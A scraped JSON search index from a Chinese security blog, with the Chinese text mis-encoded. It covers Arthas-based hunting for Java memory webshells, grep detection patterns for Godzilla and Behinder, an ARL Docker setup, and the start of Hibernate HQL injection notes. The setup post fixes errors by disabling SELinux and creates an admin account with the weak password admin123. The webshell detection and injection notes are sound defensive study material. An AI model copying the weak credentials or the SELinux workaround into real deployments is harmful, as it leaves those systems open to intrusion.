","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:2","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"Arthasæ’æŸ¥ Arthas åªèƒ½æ’æŸ¥æ˜¯å¦å­˜åœ¨ï¼Œæå–å†…å­˜é©¬Classå¹¶åç¼–è¯‘ï¼Œæ— æ³•ç›´æ¥åˆ é™¤ã€‚ æŸ¥çœ‹ Mbean çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹å¼‚å¸¸Filter/ServletèŠ‚ç‚¹ mbean | grep \"Servlet\" mbean | grep Filter åœ¨çœŸå®å¸¸è§ä¸­ï¼Œå°±éœ€è¦æˆ‘ä»¬å¯¹è¿™äº›ç›¸åº”çš„servletã€filteråç§°æœ‰ä¸€äº›äº†è§£ï¼Œä»è€Œå‘ç°å…¶ä¸­çš„å¼‚å¸¸å¯ç–‘ç±»ã€‚ æœç´¢æŸ¥çœ‹JVMå·²åŠ è½½çš„ç±»ä¿¡æ¯ï¼Œæ¨¡ç³ŠåŒ¹é…Servletå’ŒFilterç±» sc *.Servlet sc *.Filter å¯ä»¥çœ‹åˆ°æ–°å¢äº†å¾ˆå¤šç±»ï¼Œå…¶ä¸­æœ‰äº›æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„shell01.jspå¯¼è‡´ çš„ï¼Œæˆ‘ä»¬å¯¹å…¶ä¸­å¯ç–‘çš„ç±»è¿›è¡Œåˆ†æã€‚ åç¼–è¯‘æŒ‡å®šçš„ç±» jad --source-only org.apache.jsp.shell01_jsp è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œåç¼–è¯‘è¾“å‡ºçš„ç»“æœèƒ½å¾ˆæ¸…æ™°çš„æŸ¥çœ‹åˆ°å†°èé©¬çš„å†…å®¹å’Œå¯†ç ã€‚ dumpå¯ç–‘ç±»è¿›è¡Œåˆ†æ dump org.apache.coyote.deser.CreatorProperty dump org.apache.coyote.deser.std.ByteBufferDeserializer é€šè¿‡åç¼–è¯‘å·¥å…·åç¼–è¯‘ç›¸å…³ç±»ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å†…å­˜é©¬çš„æ¶æ„è¯­å¥ org.apache.coyote.deser.CreatorPropertyå¯¹åº”çš„Servletç±»å†…å­˜é©¬ï¼š org.apache.coyote.deser.std.ByteBufferDeserializerå¯¹åº”çš„Filterç±»å†…å­˜é©¬ï¼š å†…å­˜Dump [arthas@13465]$ heapdump Dumping heap to /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/temp/heapdump2025-07-10-16-325369075522353126614.hprof ... Heap dump file created #è®¾ç½®ä¿å­˜è·¯å¾„æ—¶å»ºè®®ç”¨ç»å¯¹è·¯å¾„ [arthas@13465]$ heapdump /Users/xavier/Desktop/Tmp/heapdump-1.hprof Dumping heap to /Users/xavier/Desktop/Tmp/heapdump-1.hprof ... Heap dump file created æ ¹æ®å…³é”®è¯è¿›è¡Œæ£€ç´¢ $ strings heapdump-1.hprof | grep \"POST /\" $ strings heapdump-1.hprof| grep \"favicon.ico\" com/taobao/arthas/core/http/favicon.icoPK POST //favicon.ico HTTP/1.1 org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/].[/favicon.ico]! J2EEApplication=none,J2EEServer=none,WebModule=//localhost/,j2eeType=Servlet,name=/favicon.ico! Catalina:J2EEApplication=none,J2EEServer=none,WebModule=//localhost/,j2eeType=Servlet,name=/favicon.ico\" /favicon.ico! /favicon.icoo æ¥è‡ªç½‘ç»œçš„ å†°èã€å“¥æ–¯æ‹‰å†…å­˜æ£€æµ‹å‘½ä»¤ # dumpå†…å­˜ï¼Œç”¨arthas Dumpå†…å­˜æ›¿ä»£ jmap -dump:live,format=b,file=heapdump.hprof pid # æ£€æµ‹Godzilla if grep -q 'getBasicsInfo' heapdump.hprof \u0026\u0026 grep -q 'srcFileName' heapdump.hprof \u0026\u0026 grep -q 'destFileName' heapdump.hprof;then echo 'exist Godzilla';else echo '';fi; # æ£€æµ‹å†°è if grep -q 'basicInfo' heapdump.hprof \u0026\u0026 grep -q 'currentPath' heapdump.hprof \u0026\u0026 grep -q 'driveList' heapdump.hprof;then echo 'exist behinder';else echo '';fi; ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:3","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"æ¸…é™¤å†…å­˜é©¬ æ¸…æ¥šå†…å­˜é©¬æœ€å¸¸è§çš„æ–¹å¼å°±æ˜¯å¯¹æœåŠ¡è¿›è¡Œé‡å¯ã€‚ é’ˆå¯¹äºServletç±»å’ŒFilterç±»ï¼Œå¯ä»¥é‡‡ç”¨å·¥å…·è¿›è¡Œæ¸…é™¤ï¼Œæ¯”å¦‚ä¸Šé¢çš„ Java-Memshell-Scanner ç‚¹å‡» Kill è¿›è¡Œæ¸…é™¤ã€‚ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:4","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"å‚è€ƒæ–‡çŒ® æŸ¥æ€Java web filterå‹å†…å­˜é©¬ c0ny1 2020-08-13 Filter/Servletå‹å†…å­˜é©¬çš„æ‰«ææŠ“æ•ä¸æŸ¥æ€ c0ny1Â 2020-09-09 å†°èã€å“¥æ–¯æ‹‰ å†…å­˜é©¬åº”æ€¥æ’æŸ¥ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:6:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"æ–‡ä»¶å±æ€§ åˆ›å»ºæ—¶é—´ï¼š2025-06-25 10:52 ä¿®è®¢è®°å½•ï¼š 2025-06-25 ï¼Œæ­¤æ¬¡ä¿®è®¢å†…å®¹| æ–°å»º å¤‡æ³¨ï¼šxxx ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:7:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["Tools"],"content":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","date":"2025-03-15","objectID":"/posts/arl_setup_record/","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"ä¹‹å‰çš„äº‘æœåŠ¡å™¨ä¸ç”¨äº†ï¼Œæ¢äº†ä¸ªæ–°çš„ï¼Œå› æ­¤ARLä¹Ÿè¦é‡æ–°æ­å»ºäº†ï¼Œä¹‹å‰æ­å»ºçš„æ—¶å€™æ²¡æœ‰åšç¬”è®°ï¼Œæ‰€ä»¥è¿™æ¬¡å°±è®°ä¸€ä¸‹ã€‚ ARLä¸»ä»“åº“å·²ç»å…³é—­å¾ˆä¹…äº†ï¼Œç”¨çš„ARL dockeré•œåƒä»“åº“ï¼š ARL-docker ä¸­é—´éœ€è¦è§£å†³å‡ ä¸ªé—®é¢˜ï¼Œå‰ä¸‰ä¸ªæˆ‘å°±ä¸è¯´äº†ï¼Œæœ¬æ–‡ä¸»è®²ç¬¬4æ­¥ã€‚ docker çš„å®‰è£… docker é•œåƒä»“åº“ï¼Œä»£ç†è®¿é—® Linux æ­å»º ä»£ç†ï¼Œæˆ‘ç”¨çš„clash ARL-docker æ­å»º ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:0:0","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"ARL-docker æ­å»º åœ¨çº¿ä¸‹è½½å®‰è£…æ³• ä¸‹è½½éƒ¨ç½²è„šæœ¬é¡¹ç›®ï¼šgit clone https://github.com/honmashironeko/ARL-docker.git è¿›å…¥é¡¹ç›®æ–‡ä»¶å¤¹ï¼šcd ARL-docker/ æ·»åŠ è¿è¡Œæƒé™ï¼šchmod +x setup-arl.sh æ‰§è¡Œéƒ¨ç½²è„šæœ¬ï¼šbash setup-arl.sh å¯èƒ½ä¼šåœ¨è¿è¡Œçš„æ—¶å€™æŠ¥é”™ä¸€æ¬¡ï¼Œä¸éœ€è¦ç®¡ä»–ï¼Œé‡æ–°è¿è¡Œä¸€é bash setup-arl.sh å³å¯ã€‚ å¯åŠ¨ ARL å‘½ä»¤ï¼šdocker-compose up -d æ¥ä¸‹æ¥å°±æ˜¯è®°å½•ä¸€äº›é—®é¢˜ã€æ’æŸ¥è¿‡ç¨‹åŠè§£å†³åŠæ³•äº†ã€‚ ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:1:0","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"Q1ï¼šæœåŠ¡æ— æ³•å¯åŠ¨ ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:2:0","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"é—®é¢˜æè¿° å¯åŠ¨ ARL å‘½ä»¤ï¼šdocker-compose up -d docker ps å‘ç°æœåŠ¡æ— æ³•å¯åŠ¨ æœ‰ä¸‰ä¸ªå®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨ arl_webã€arl_workerã€arl_schedulerï¼Œ [root@localhost ARL-docker]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7045ec724fa5 honmashironeko/arl-docker-all \"sh -c 'gen_crt.sh...\" 5 hours ago Restarting (1) 3 minutes ago arl_web 94a3497339c0 honmashironeko/arl-docker-all \"sh -c 'wait-for-i...\" 5 hours ago Restarting (255) 3 minutes ago arl_worker 3bdd87b9a0f3 honmashironeko/arl-docker-all \"sh -c 'wait-for-i...\" 5 hours ago Restarting (255) 3 minutes ago arl_scheduler 58f66a52f583 rabbitmq:3.8.19-management-alpine \"docker-entrypoint...\" 5 hours ago Up 7 minutes 4369/tcp, 5671-5672/tcp, 15671-15672/tcp, 15691-15692/tcp, 25672/tcp arl_rabbitmq 457a964ab6dc mongo:4.0.27 \"docker-entrypoint...\" 5 hours ago Up 7 minutes 27017/tcp arl_mongodb æ’æŸ¥æ—¥å¿—ï¼š docker logs --tail 20 \u003cCONTAINER ID\u003e æœ‰å‡ ä¸ªæƒé™æŠ¥é”™ï¼š Error: Error: 'arl_web.log' isn't writable [PermissionError(13, 'Permission denied')] è¿˜æœ‰ä¸ª/code/app/config.yaml çš„æƒé™æŠ¥é”™ï¼Œæ—¥å¿—åˆ·æ²¡äº†ï¼Œä¸è®°å¾—å…·ä½“æŠ¥é”™å‘½ä»¤äº†ã€‚ çœ‹é…ç½®æ–‡ä»¶æ˜¯æœ¬åœ°æ–‡ä»¶å’Œå®¹å™¨æ–‡ä»¶çš„æ˜ å°„ [root@localhost ARL-docker]# cat docker-compose.yml â€¦â€¦ services: web: â€¦â€¦ volumes: - ./arl_web.log:/code/arl_web.log - ./config-docker.yaml:/code/app/config.yaml æ£€æŸ¥æ–‡ä»¶ã€ç›®å½•æƒé™ï¼Œå®¹å™¨å†…ç”¨æˆ·èº«ä»½ï¼Œæ£€æŸ¥ SELinux ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:2:1","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"è§£å†³åŠæ³• æœ€åæˆ‘æ‰¾åˆ°çš„è§£å†³åŠæ³•æ˜¯å…³é—­SELinux sudo sestatus # æŸ¥çœ‹ SELinux çŠ¶æ€ sudo setenforce 0 # ä¸´æ—¶å…³é—­ SELinux [root@localhost ARL-docker]# sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 31 [root@localhost ARL-docker]# sudo setenforce 0 [root@localhost ARL-docker]# sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: permissive Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 31 æ¸…é™¤ä¸€ä¸‹ï¼Œä¹‹åå†é‡å¯ä¸‹å°±è§£å†³äº†ã€‚ [root@localhost ARL-docker]# docker-compose down [+] Running 6/6 âœ” Container arl_web Removed 0.3s âœ” Container arl_scheduler Removed 0.3s âœ” Container arl_worker Removed 0.3s âœ” Container arl_rabbitmq Removed 0.0s âœ” Container arl_mongodb Removed 0.0s âœ” Network arl-docker_default Removed 0.2s [root@localhost ARL-docker]# docker-compose up -d [+] Building 0.0s (0/0) [+] Running 6/6 âœ” Network arl-docker_default Created 0.2s âœ” Container arl_mongodb Started 0.9s âœ” Container arl_rabbitmq Started 0.9s âœ” Container arl_worker Started 1.6s âœ” Container arl_scheduler Started 1.6s âœ” Container arl_web Started 1.7s [root@localhost ARL-docker]# ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:2:2","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"Q2ï¼šWebå¯†ç é”™è¯¯ ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:3:0","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"é—®é¢˜æè¿° å‰å¾€ARLwebé¡µé¢ï¼šhttps://IP:5003/ï¼Œè´¦å·ï¼šadminï¼Œå¯†ç ï¼šhonmashironekoï¼Œæç¤ºå¯†ç é”™è¯¯ è¿› arl_web æœåŠ¡å®¹å™¨çœ‹äº†ä¸‹ä»£ç  [root@localhost ARL-docker]# docker exec -it arl_web /bin/bash [root@6a3109921ab8 code]# ls app arl_web.log frontend requirements.txt test [root@6a3109921ab8 app]# cat utils/user.py from flask import request from app import modules from app.config import Config from . import gen_md5, random_choices from .conn import conn_db salt = 'arlsalt!@#' def user_login(username = None, password = None): if not username or not password: return query = {\"username\": username, \"password\": gen_md5(salt + password)} if conn_db('user').find_one(query): item = { \"username\": username, \"token\": gen_md5(random_choices(50)), \"type\": \"login\" } conn_db('user').update_one(query, {\"$set\": {\"token\": item[\"token\"]}}) return item åˆçœ‹äº†MongoDBæ•°æ®åº“ï¼Œæ²¡å‘ç°æœ‰è´¦å·è®°å½• [root@localhost xavier]# docker exec -ti arl_mongodb mongo -u admin -p admin MongoDB shell version v4.0.27 connecting to: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb Implicit session: session { \"id\" : UUID(\"dd7329eb-ea82-4041-a454-d43aedb1328b\") } MongoDB server version: 4.0.27 Welcome to the MongoDB shell. â€¦â€¦â€¦â€¦ \u003e use arl switched to db arl \u003e db.user.find() \u003e db.getCollectionNames(); [ \"asset_domain\", \"asset_ip\", \"asset_site\", \"cert\", \"domain\", \"fileleak\", \"github_monitor_result\", \"github_result\", \"ip\", \"npoc_service\", \"poc\", \"service\", \"site\", \"url\", \"vuln\", \"wih\" ] æ²¡çœ‹åˆ°æœ‰userè¡¨ ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:3:1","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Tools"],"content":"è§£å†³åŠæ³• æ·»åŠ è´¦æˆ·è®°å½• \u003e db.user.insert({ username: 'admin', password: hex_md5('arlsalt!@#'+'admin123') }) WriteResult({ \"nInserted\" : 1 }) \u003e db.user.find() { \"_id\" : ObjectId(\"67d5ab76da9827cdcf275ce3\"), \"username\" : \"admin\", \"password\" : \"fd9fb75bf102e785e6874af0025a331e\" } \u003e db.getCollectionNames(); [ \"asset_domain\", \"asset_ip\", \"asset_site\", \"cert\", \"domain\", \"fileleak\", \"github_monitor_result\", \"github_result\", \"ip\", \"npoc_service\", \"poc\", \"service\", \"site\", \"url\", \"user\", \"vuln\", \"wih\" ] æœ€åç”¨äº†adminã€admin123 æˆåŠŸç™»å½•ã€‚ ","date":"2025-03-15","objectID":"/posts/arl_setup_record/:3:2","tags":["Tools","Docker"],"title":"ARLç¯å¡”Dockerç‰ˆæ­å»ºè®°å½•","uri":"/posts/arl_setup_record/"},{"categories":["Pentest"],"content":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"Hibernateæ¡†æ¶ Hibernateæ˜¯ä¸€ç§ORMæ¡†æ¶ï¼Œç”¨æ¥æ˜ å°„ä¸tablesç›¸å…³çš„ç±»å®šä¹‰ï¼ˆä»£ç ï¼‰ï¼Œå¹¶åŒ…å«ä¸€äº›é«˜çº§ç‰¹æ€§ï¼ŒåŒ…æ‹¬ç¼“å­˜ä»¥åŠç»§æ‰¿ï¼Œé€šå¸¸åœ¨ Javaä¸.NETä¸­ä½¿ç”¨ï¼ˆå¯å‚è€ƒ NHibernateï¼‰ï¼Œä½†åœ¨Javaç”Ÿæ€ç³»ç»Ÿä¸­æ›´å—æ¬¢è¿ã€‚ å†…éƒ¨æ”¯æŒä½¿ç”¨åŸç”ŸSQLè¿˜æœ‰HQLè¯­è¨€è¿›è¡ŒSQLæ“ä½œã€‚ é€šå¸¸ä½¿ç”¨Hibernateæ¡†æ¶éƒ½æ˜¯ä½¿ç”¨HQLè¯­è¨€æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"1ã€åŸç”ŸSQLè¯­å¥ String parameter = req.getParameter(\"name\"); Query query = session.createSQLQuery(\"SELECT table_name FROM information_schema.tables where table_schema=?\"); query.setParameter(1, parameter); åœ¨Hibernate 5.2.5.Final ç‰ˆæœ¬ä¸­createSQLQueryè¢«å¼ƒç”¨äº† ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:1","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"2ã€HQLè¯­å¥ HQLè¯­æ³• # æ³¨æ„è¿™é‡ŒæŸ¥è¯¢çš„éƒ½æ˜¯JAVAç±»å¯¹è±¡ select \"å¯¹è±¡.å±æ€§å\" from \"å¯¹è±¡å\" where \"æ¡ä»¶\" group by \"å¯¹è±¡.å±æ€§å\" having \"åˆ†ç»„æ¡ä»¶\" order by \"å¯¹è±¡.å±æ€§å\" HQLéœ€è¦å°†æ•°æ®åº“ä¸­çš„è¡¨æ˜ å°„ä¸ºç›¸åº”çš„ç±»ï¼Œé€šè¿‡JAVAç±»å¯¹è±¡è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼šã€‚ String parameter = req.getParameter(\"name\"); Query query = session.createQuery(\"from User where name = ?1\", User.class); query.setParameter(1, parameter); å…¶ä¸­Userå°±æ˜¯æ•°æ®åº“è¡¨çš„æ˜ å°„å®ç°ç±»å¯¹è±¡ HQLæŸ¥è¯¢æ˜¯ç”± hibernate å¼•æ“å¯¹æŸ¥è¯¢è¿›è¡Œè§£æå¹¶è§£é‡Šï¼Œç„¶åå°†å…¶è½¬æ¢ä¸ºSQLã€‚ å‚æ•°ç±»å‹æ”¯æŒ3ç§ï¼Œä¸Šé¢ç”¨çš„å°±æ˜¯å™è¿°å‚æ•°ï¼Œç¬¬ä¸‰ç§åŸºæœ¬ä¸ç”¨ã€‚ Parameter type å‚æ•°ç±»å‹ Examples ä¾‹å­ Usage from Java Javaç”¨æ³• å‘½åå‚æ•° :name, :title, :id :nameï¼Œ:titleï¼Œ:id query.setParameter(\"name\", name) åºæ•°å‚æ•° ?1, ?2, ?3 ?1ï¼Œ?2ï¼Œ?3 query.setParameter(1, name) JDBCæ ·å¼å‚æ•° ? query.setParameter(1, name) ?å½¢å¼çš„JDBCæ ·å¼å‚æ•°ç±»ä¼¼äºåºæ•°å‚æ•°ï¼Œå…¶ä¸­ç´¢å¼•æ˜¯ä»æŸ¥è¯¢æ–‡æœ¬ä¸­çš„ä½ç½®æ¨æ–­å‡ºæ¥çš„ã€‚ä¸æ¨èä½¿ç”¨JDBCæ ·å¼å‚æ•°ã€‚ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:2","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"3ã€åŸºç¡€ç¤ºä¾‹ä»£ç  ç¤ºä¾‹æ•°æ®åº“ï¼š mysql\u003e select * from users; +------+------+------------------+ | id | name | email | +------+------+------------------+ | 1 | test | test@example.com | +------+------+------------------+ 1 row in set (0.01 sec) 1ï¼‰æ–°å»ºMavené¡¹ç›® æ‰“å¼€IDEï¼Œé€‰æ‹©æ–°å»ºMavené¡¹ç›®ã€‚ åœ¨pom.xmlä¸­æ·»åŠ Hibernateå’Œæ•°æ®åº“é©±åŠ¨çš„ä¾èµ–ï¼š \u003cdependencies\u003e \u003c!-- Hibernate Core --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.hibernate\u003c/groupId\u003e \u003cartifactId\u003ehibernate-core\u003c/artifactId\u003e \u003cversion\u003e5.6.15.Final\u003c/version\u003e \u003c/dependency\u003e \u003c!-- MySQL Connector --\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.33\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 2ï¼‰é…ç½®Hibernateæ–‡ä»¶ hibernateé…ç½®xmlæ–‡ä»¶åŒ…å«ä¸æ•°æ®åº“è¿æ¥ç›¸å…³çš„å±æ€§å’Œæ˜ å°„ç±» åœ¨src/main/resourcesç›®å½•ä¸‹åˆ›å»ºhibernate.cfg.xmlæ–‡ä»¶ï¼Œé…ç½®æ•°æ®åº“è¿æ¥å’ŒHibernateå±æ€§ï¼š \u003chibernate-configuration\u003e \u003csession-factory\u003e \u003c!-- Database connection settings --\u003e \u003cproperty name=\"hibernate.connection.driver_class\"\u003ecom.mysql.cj.jdbc.Driver\u003c/property\u003e \u003cproperty name=\"hibernate.connection.url\"\u003ejdbc:mysql://localhost:3306/testdb\u003c/property\u003e \u003cproperty name=\"hibernate.connection.username\"\u003eroot\u003c/property\u003e \u003cproperty name=\"hibernate.connection.password\"\u003epassword\u003c/property\u003e \u003c!-- SQL dialect --\u003e \u003cproperty name=\"hibernate.dialect\"\u003eorg.hibernate.dialect.MySQL8Dialect\u003c/property\u003e \u003c!-- Echo all executed SQL to stdout --\u003e \u003cproperty name=\"hibernate.show_sql\"\u003etrue\u003c/property\u003e \u003cproperty name=\"hibernate.format_sql\"\u003etrue\u003c/property\u003e \u003c!-- Drop and re-create the database schema on startup --\u003e \u003cproperty name=\"hibernate.hbm2ddl.auto\"\u003eupdate\u003c/property\u003e \u003c/session-factory\u003e \u003c/hibernate-configuration\u003e ç¡®ä¿æ•°æ®åº“testdbå·²åˆ›å»ºï¼Œç”¨æˆ·åå¯†ç é…ç½®æ­£ç¡®ã€‚ å¯ç”¨hibernate.show_sqlå¯ä»¥æŸ¥çœ‹ç»è¿‡HQLå¼•æ“å¤„ç†åç”Ÿæˆçš„SQLè¯­å¥ï¼Œå¯ç”¨hibernate.format_sqlå¯ä»¥ä½¿è¾“å‡ºçš„SQLè¯­å¥æ›´å¯è¯»ã€‚ åœ¨è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­ï¼Œè¿˜å¯ä»¥æ˜¾å¼å£°æ˜å®ä½“ç±»ï¼Œå†™æ³•ä¸ºï¼š \u003cmapping class=\"com.example.User\"/\u003e 3ï¼‰åˆ›å»ºæ¨¡å‹ç±» åˆ›å»ºä¸€ä¸ªJavaç±»ä½œä¸ºæ¨¡å‹ç±»ï¼Œå°†æ•°æ®åº“è¡¨æ˜ å°„ä¸ºç›¸å…³çš„ç±»ã€‚ æ–°å»ºäº†ä¸€ä¸ªUserç±»ï¼Œå¯¹åº”usersè¡¨ï¼Œå£°æ˜å…¶ä¸­ç›¸å¯¹åº”çš„åˆ—å import javax.persistence.*; @Entity @Table(name = \"users\") public class User { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private int id; @Column(name = \"name\") private String name; @Column(name = \"email\") private String email; // Getter and Setter for id public int getId() { return id; } public void setId(int id) { this.id = id; } // Getter and Setter for name public String getName() { return name; } public void setName(String name) { this.name = name; } // Getter and Setter for email public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } // Optional: Override toString() for better logging @Override public String toString() { return \"User{\" + \"id=\" + id + \", name='\" + name + '\\'' + \", email='\" + email + '\\'' + '}'; } } ä½¿ç”¨æ³¨è§£å°†ç±»æ˜ å°„åˆ°æ•°æ®åº“è¡¨ã€‚ 4ï¼‰SessionFactoryç±» åˆ›å»ºå·¥å…·ç±»HibernateUtilä»¥ç®¡ç†Sessionï¼š import org.hibernate.SessionFactory; import org.hibernate.cfg.Configuration; public class HibernateUtil { private static final SessionFactory sessionFactory = buildSessionFactory(); private static SessionFactory buildSessionFactory() { try { return new Configuration().configure().buildSessionFactory(); } catch (Throwable ex) { throw new ExceptionInInitializerError(ex); } } public static SessionFactory getSessionFactory() { return sessionFactory; } } 5ï¼‰ä½¿ç”¨HQLæŸ¥è¯¢ åœ¨Mainç±»ä¸­ç¼–å†™æŸ¥è¯¢ä»£ç ï¼š import org.hibernate.Session; import org.hibernate.query.Query; public class Main { public static void main(String[] args) { Session session = HibernateUtil.getSessionFactory().openSession(); session.beginTransaction(); // HQLæŸ¥è¯¢ç¤ºä¾‹ Query\u003cUser\u003e query = session.createQuery(\"FROM User WHERE email = :email\", User.class); query.setParameter(\"email\", \"test@example.com\"); User user = query.uniqueResult(); System.out.println(\"User: \" + user.getName()); session.getTransaction().commit(); session.close(); } } ä¸Šå›¾æ˜¯é…ç½®æ–‡ä»¶ä¸­æ²¡åŠ \u003cproperty name=\"hibernate.format_sql\"\u003etrue\u003c/property\u003e æ—¶çš„è¾“å‡ºï¼Œæ‡’å¾—æ”¹äº† ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:3","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"4ã€Webç¤ºä¾‹ä»£ç  åŸºäºä¸Šè¿°ä»£ç ï¼Œå°†å…¶æ”¹ä¸ºWebæœåŠ¡ æ–‡ä»¶ç›®å½•ï¼š src/main/ â”œâ”€â”€ java/ â”‚ â””â”€â”€ com/example/ â”‚ â”œâ”€â”€ User.java â”‚ â”œâ”€â”€ HibernateUtil.java â”‚ â””â”€â”€ UserServlet.java â”œâ”€â”€ resources/ â”‚ â””â”€â”€ hibernate.cfg.xml â””â”€â”€ webapp/ â””â”€â”€ WEB-INF/ â””â”€â”€ web.xml UserServletç±» package com.example; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; import org.hibernate.Session; import org.hibernate.query.Query; @WebServlet(\"/user\") public class UserServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setContentType(\"text/plain\"); PrintWriter out = resp.getWriter(); String parameter = req.getParameter(\"name\"); if (parameter == null || parameter.isEmpty()) { out.println(\"Error: 'name' 